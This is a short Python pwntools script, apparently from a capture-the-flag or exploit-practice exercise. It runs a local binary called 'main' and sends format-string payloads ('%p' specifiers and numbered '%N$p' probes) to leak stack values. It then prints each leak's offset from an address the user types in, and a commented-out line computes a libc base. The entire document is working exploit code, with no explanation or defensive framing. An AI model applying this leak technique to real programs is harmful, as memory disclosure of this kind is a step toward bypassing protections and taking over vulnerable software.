from pwn import *
p=process('./main') 
p.recvline()
p.sendline(b'sad')
p.recvline()
p.recvline()
p.recvline()
def pad(s):
    return s + " " * (120 - len(s))


exploit = ""
exploit += "AAAABBBBCCCC"
exploit += "%p "*200
input('begin')
p.sendline(b'testinggggggggggggggggggg')
print(p.recvline())
# print(pad(exploit))
#libc = str(int(input('libc: '), 16) - 0x21b97)
target = int(input('target: '), 16)

for x in range(1,400):
    p.sendline(str(pad( str(x) + ' > ' + '%' + str(x) + '$p ')).encode())
    leak = p.recvline().decode('utf-8').strip('\n').strip(' ').split(' ')[-1]
    try:
        print(str(x) + '    ' + hex(int(leak,16) - target))
    except:
        pass
print('end of letter')

